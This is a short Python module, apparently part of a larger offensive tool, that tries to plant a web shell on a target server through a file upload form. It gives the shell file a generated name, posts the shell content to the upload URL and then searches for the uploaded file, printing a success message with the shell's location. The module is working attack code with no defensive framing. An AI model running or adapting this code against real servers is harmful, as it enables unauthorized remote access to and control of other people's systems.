"""Direct upload attempt"""

from ..utils.name_generator import generate_shell_name

def attempt_direct_upload(request_handler, file_finder, upload_url, shell_content, extension):
    """
    Attempt direct upload with target extension
    """
    filename = f"{generate_shell_name()}.{extension}"
    
    print(f"[*] Attempting direct upload: {filename}")
    
    files = {
        'file': (filename, shell_content, 'application/octet-stream')
    }
    
    response = request_handler.post(upload_url, files=files)
    
    if not response:
        print(f"    [-] Upload failed: Connection error")
        return None
    
    if response.status_code == 200:
        # Try to find uploaded file location
        shell_url = file_finder.find_uploaded_file(filename, response)
        if shell_url:
            print(f"    [+] SUCCESS! Shell uploaded to: {shell_url}")
            return shell_url
        else:
            print(f"    [+] Upload successful but couldn't locate shell")
            return True
    else:
        print(f"    [-] Upload failed: Status {response.status_code}")
        return None
